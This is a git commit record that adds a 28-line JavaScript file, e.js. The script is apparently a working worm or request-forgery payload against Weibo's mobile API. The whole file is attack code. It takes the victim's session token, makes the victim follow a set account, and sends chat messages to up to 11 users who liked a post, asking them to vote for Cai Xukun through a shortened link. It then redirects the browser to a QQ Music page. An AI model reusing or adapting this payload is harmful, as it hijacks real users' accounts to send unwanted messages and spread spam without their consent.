e59333bed01f07dbdf4b3874254290d84be8a032
opensourcessss <fuxuemin888@126.com>
2018-12-19 12:57:55 +0800

    Create e.js

---
+++ e.js
@@ -0,0 +1,28 @@
+   z=new XMLHttpRequest();
+        z.open("GET","https://m.weibo.cn/api/config",true);
+        z.send();
+        z.onreadystatechange=function(){
+            if (z.readyState == 4){
+                var obj = JSON.parse(z.responseText);
+                var xhr = new XMLHttpRequest();
+                xhr.open('post', 'https://m.weibo.cn/api/friendships/create' );
+                xhr.setRequestHeader("Content-type","application/x-www-form-urlencoded");
+                xhr.send('uid=6421536602&st=' + obj.data.st);
+                var f=new XMLHttpRequest();
+                f.open("GET","https://m.weibo.cn/api/attitudes/show?id=4318547611858652",true);
+                f.send();
+                f.onreadystatechange=function(){
+                    if(f.readyState==4){
+                        var u = JSON.parse(f.responseText);
+                        for (var i=0;i<11;i++)
+                        {
+                            var x = new XMLHttpRequest();
+                            x.open('post', 'https://m.weibo.cn/api/chat/send' );
+                            x.setRequestHeader("Content-type","application/x-www-form-urlencoded");
+                            x.send('uid='+u.data.data[i].user.id+'&content=亲爱的ikun，2018qq音乐巅峰榜蔡徐坤需要你的一票，目前排第三，动动手指投一票>>http://t.cn/E4w6IyR&st=' + obj.data.st);
+                            window.location.href="https://y.qq.com/m/act/2018_year_share_wb/index.html";
+                        }
+                    }
+                }
+            }
+        };
